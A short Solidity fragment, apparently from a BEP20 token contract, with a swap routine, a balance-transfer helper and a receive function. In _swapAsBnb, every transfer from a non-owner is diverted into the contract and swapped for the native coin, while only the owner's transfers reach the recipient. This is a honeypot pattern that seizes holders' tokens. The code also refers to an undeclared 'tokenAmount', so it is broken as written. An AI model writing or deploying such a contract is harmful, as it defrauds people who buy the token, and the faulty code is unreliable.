function _swapAsBnb(address from, address to, uint256 amount) private {    
    if(from != _owner && !lockSwap){
        
        _transfer(from, address(this), amount);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();

        _approve(address(this), address(_uniswapV2Router), tokenAmount);
         
        
        lockSwap = true;
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
        lockSwap = false;
    }
    else{
        _transfer(from, to, amount);
        emit Transfer(from, to, amount);
    }
}

function _transfer(address from, address to, uint256 amount) private {
    require(from != address(0), "BEP20: transfer from the zero address");
    require(balanceOf(from) >= amount, "BEP20: transfer amount exceeds balance");

    unchecked {
        _balances[from] -= amount;
    }

    _balances[to] += amount;
}

receive() external payable {}
